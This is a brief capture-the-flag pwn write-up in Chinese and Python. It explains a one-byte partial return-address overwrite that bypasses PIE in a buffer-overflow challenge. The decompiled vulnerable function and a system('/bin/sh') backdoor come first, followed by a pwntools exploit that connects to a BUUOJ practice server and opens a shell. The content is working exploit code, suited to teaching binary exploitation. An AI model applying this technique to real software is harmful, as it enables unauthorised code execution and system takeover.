"""p1eee
ELF是按页对齐，一页是0x1000，所以低三位十六进制的值不会改变因为后门函数的地址与有溢出的函数的地址非常接近，所以只需修改最低一字节就能控制程序流到后门
ssize_t sub_120E()
{
  __int64 buf[4]; // [rsp+0h] [rbp-20h] BYREF

  memset(buf, 0, sizeof(buf));
  puts("A nice try to break pie!!!");
  return read(0, buf, 0x29uLL);
}

.text:0000000000001268 sub_1268 proc near
.text:0000000000001268 push    rbp
.text:0000000000001269 mov     rbp, rsp
.text:000000000000126C lea     rdi, command                    ; "/bin/sh"
.text:0000000000001273 call    _system
.text:000000000000127A retn
"""
from pwn import *

context.update(os='linux', arch='amd64', log_level='debug')
binary = './pwn'
elf = ELF(binary)
# libc=ELF('')
p = remote('node4.buuoj.cn', 25777)

p.recvline()

pay = b'a' * 0x20 + p64(0xdeadbeef) + b'\x6c'
p.send(pay)

p.interactive()
